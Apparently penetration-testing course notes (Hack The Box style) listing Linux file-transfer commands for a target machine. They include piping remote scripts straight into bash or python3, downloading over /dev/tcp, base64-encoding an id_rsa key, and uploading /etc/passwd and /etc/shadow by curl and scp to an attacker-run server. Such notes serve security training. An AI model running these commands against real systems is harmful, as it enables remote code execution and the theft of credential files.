
## Base64 Encoding / Decoding
#### Pwnbox - Check File MD5 hash
```shell-session
$ md5sum id_rsa
```
```shell-session
$ cat id_rsa |base64 -w 0;echo
```
```shell-session
$ echo -n 'todecode' | base64 -d > id_rsa
```

## Web Downloads with Wget and cURL
#### Download a File Using wget
```shell-session
$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```
#### Download a File Using cURL
```shell-session
$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```
## Fileless Attacks Using Linux
#### Fileless Download with cURL
Let's take the `cURL` command we used, and instead of downloading LinEnum.sh, let's execute it directly using a pipe.
```shell-session
$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```
#### Fileless Download with wget
```shell-session
$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

## Download with Bash (/dev/tcp)
There may also be situations where none of the well-known file transfer tools are available. As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.
#### Connect to the Target Webserver
```shell-session
$ exec 3<>/dev/tcp/10.10.10.32/80
```
#### HTTP GET Request
```shell-session
4rn4u@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```
#### Print the Response
```shell-session
$ cat <&3
```

## SSH Downloads
`SCP` (secure copy) is a command-line utility that allows you to copy files and directories between two hosts securely. We can copy our files from local to remote servers and from remote servers to our local machine.

`SCP` is very similar to `copy` or `cp`, but instead of providing a local path, we need to specify a username, the remote IP address or DNS name, and the user's credentials.
#### Enabling the SSH Server
```shell-session
$ sudo systemctl enable ssh
```
#### Starting the SSH Server
```shell-session
$ sudo systemctl start ssh
```
#### Checking for SSH Listening Port
```shell-session
$ netstat -lnpt
```
#### Linux - Downloading Files Using SCP
```shell-session
$ scp plaintext@192.168.49.128:/root/myroot.txt . 
```

# Upload Operations
## Web Upload
#### Pwnbox - Start Web Server
```shell-session
$ sudo python3 -m pip install --user uploadserver
```
#### Pwnbox - Create a Self-Signed Certificate
```shell-session
$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```
#### Pwnbox - Start Web Server
```shell-session
$ mkdir https && cd https
```
```shell-session
$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```
#### Linux - Upload Multiple Files
```shell-session
$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

## Alternative Web File Transfer Method
#### Linux - Creating a Web Server with Python3
```shell-session
$ python3 -m http.server
```
#### Linux - Creating a Web Server with Python2.7
```shell-session
$ python2.7 -m SimpleHTTPServer
```
#### Linux - Creating a Web Server with PHP
```shell-session
$ php -S 0.0.0.0:8000
```
#### Linux - Creating a Web Server with Ruby
```shell-session
$ ruby -run -ehttpd . -p8000
```
#### Download the File from the Target Machine onto the Pwnbox
```shell-session
$ wget 192.168.49.128:8000/filetotransfer.txt
```

## SCP Upload
We may find some companies that allow the `SSH protocol` (TCP/22) for outbound connections, and if that's the case, we can use an SSH server with the `scp` utility to upload files. Let's attempt to upload a file to the target machine using the SSH protocol.
```shell-session
$ scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```